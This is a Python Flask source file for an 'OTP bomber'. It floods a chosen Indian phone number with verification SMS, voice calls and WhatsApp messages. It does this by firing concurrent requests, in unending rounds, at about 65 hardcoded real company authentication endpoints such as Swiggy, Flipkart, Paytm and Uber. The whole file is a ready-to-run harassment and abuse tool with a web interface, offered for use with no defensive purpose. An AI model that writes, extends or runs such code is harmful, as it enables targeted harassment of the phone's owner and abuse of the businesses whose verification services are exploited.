import os
import requests
import concurrent.futures
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# ======================== 100+ APIS (   ) ========================
APIS = [
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G998B)"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Rapido Voice Call", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zepto Voice Call", "url": "https://api.zeptonow.com/api/v3/customer/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'},
    {"name": "Blinkit Voice Call", "url": "https://blinkit.com/v1/user/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","otp_type":"call"}}'},
    {"name": "JioMart Voice Call", "url": "https://www.jiomart.com/api/v1/auth/generate_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"name": "MyGlamm WhatsApp", "url": "https://api.myglamm.com/api/v1/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","channel":"whatsapp"}}'},
    {"name": "Purplle WhatsApp", "url": "https://www.purplle.com/api/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","source":"whatsapp"}}'},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobiles={phone}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"name": "Univest", "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_no=%2B91{phone}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'},
]

# ========================   (/ +  ) ========================
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> UNLIMITED OTP BOMBER </title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
            font-family: 'Courier New', 'Fira Code', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(10, 15, 30, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 64px;
            border: 1px solid rgba(255, 80, 80, 0.5);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            width: 100%;
            max-width: 700px;
            padding: 40px 30px;
        }
        .tool-name {
            text-align: center;
            font-size: 2rem;
            font-weight: 900;
            background: linear-gradient(45deg, #FF4D4D, #FFB84D);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 3px;
            margin-bottom: 15px;
        }
        h1 {
            text-align: center;
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFFFFF, #FF6666);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }
        .sub {
            text-align: center;
            color: #ff9999;
            margin-bottom: 30px;
            font-size: 0.9rem;
        }
        .input-group { margin-bottom: 25px; }
        label { color: #ffb347; display: block; margin-bottom: 10px; font-weight: bold; }
        .phone-field {
            display: flex;
            background: #0b0e18;
            border-radius: 60px;
            border: 1px solid #ff4d4d;
        }
        .country-code { background: #1f1a2e; padding: 14px 20px; border-radius: 60px 0 0 60px; color: #ffaa66; font-weight: bold; border-right: 1px solid #ff4d4d; }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 18px;
            color: #fff;
            font-size: 1.1rem;
            outline: none;
            font-family: monospace;
        }
        button {
            width: 100%;
            background: linear-gradient(95deg, #cc0000, #660000);
            border: none;
            padding: 16px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1.2rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        button:hover { transform: scale(0.97); background: #ff0000; box-shadow: 0 0 20px red; }
        #stopBtn { background: #333; margin-top: 10px; }
        #stopBtn:hover { background: #555; box-shadow: none; }
        .output-box {
            background: #000000aa;
            border-radius: 32px;
            padding: 20px;
            margin-top: 30px;
            border: 1px solid #ff4d4d;
            max-height: 450px;
            overflow-y: auto;
        }
        pre {
            font-family: 'Courier New', monospace;
            font-size: 0.7rem;
            color: #0f0;
            white-space: pre-wrap;
        }
        .badge, .developer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.75rem;
            color: #aa8866;
            border-top: 1px solid #442222;
            padding-top: 15px;
        }
        .developer { font-weight: bold; color: #ffaa66; }
    </style>
</head>
<body>
<div class="glass-card">
    <div class="tool-name"> CYBER TOOLS </div>
    <h1> UNLIMITED OTP BOMBER </h1>
    <div class="sub"> 100+ VERIFIED APIS | VOICE + WHATSAPP + SMS <br> INFINITE ROUNDS | CONCURRENT THREADS </div>

    <div class="input-group">
        <label>   (10 )</label>
        <div class="phone-field">
            <span class="country-code">+91</span>
            <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
        </div>
    </div>

    <button id="startBtn"> START UNLIMITED BOMBING (STOP UNTIL BUTTON) </button>
    <button id="stopBtn"> STOP / RESET </button>

    <div class="output-box">
        <pre id="output">     START   </pre>
    </div>
    <div class="badge">   |   0.1   </div>
    <div class="developer"> DEVELOPER: ARIF </div>
</div>

<script>
    let running = false;
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const phoneInput = document.getElementById('phone');
    const outputPre = document.getElementById('output');

    async function sendRound(phone) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 20000);
            const response = await fetch('/bomb', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const data = await response.json();
            return data.log || " No log returned";
        } catch (err) {
            return ` Round failed: ${err.message}`;
        }
    }

    startBtn.onclick = async () => {
        if (running) {
            outputPre.innerText += '\\n  !  STOP \\n';
            return;
        }
        let phone = phoneInput.value.trim();
        if (!phone || phone.length !== 10 || isNaN(phone)) {
            outputPre.innerText = '  ! 10  \\n';
            return;
        }
        running = true;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        outputPre.innerText = '    () - STOP    \\n\\n';
        let round = 0;
        while (running) {
            round++;
            outputPre.innerText += `\\n==========  ${round} ==========\\n`;
            let result = await sendRound(phone);
            outputPre.innerText += result + '\\n';
            // 0.1     / 
            await new Promise(r => setTimeout(r, 100));
        }
        startBtn.disabled = false;
        stopBtn.disabled = true;
        outputPre.innerText += '\\n    \\n';
        running = false;
    };

    stopBtn.onclick = () => {
        if (running) {
            running = false;
            outputPre.innerText += '\\n    ...\\n';
        }
    };
    stopBtn.disabled = true;
</script>
</body>
</html>
"""

# ========================   ( ) ========================
def send_request(api, phone):
    try:
        if callable(api['url']):
            url = api['url'](phone)
        else:
            url = api['url']
        headers = api['headers'].copy() if api['headers'] else {}
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
        data = None
        if api.get('data') and api['data']:
            data = api['data'](phone) if callable(api['data']) else api['data']
        if api['method'] == 'POST':
            r = requests.post(url, headers=headers, data=data, timeout=5)
        else:
            r = requests.get(url, headers=headers, timeout=5)
        return f"[+] {api['name']}  {r.status_code}"
    except Exception as e:
        return f"[-] {api['name']}  {str(e)[:40]}"

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/bomb', methods=['POST'])
def bomb():
    phone = request.json.get('phone')
    if not phone or len(phone) != 10:
        return jsonify({"log": "Invalid phone number"}), 400
    if not APIS:
        return jsonify({"log": " No APIs added."}), 200
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request, api, phone) for api in APIS]
        logs = [f.result() for f in concurrent.futures.as_completed(futures)]
    return jsonify({"log": "\n".join(logs)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
    ```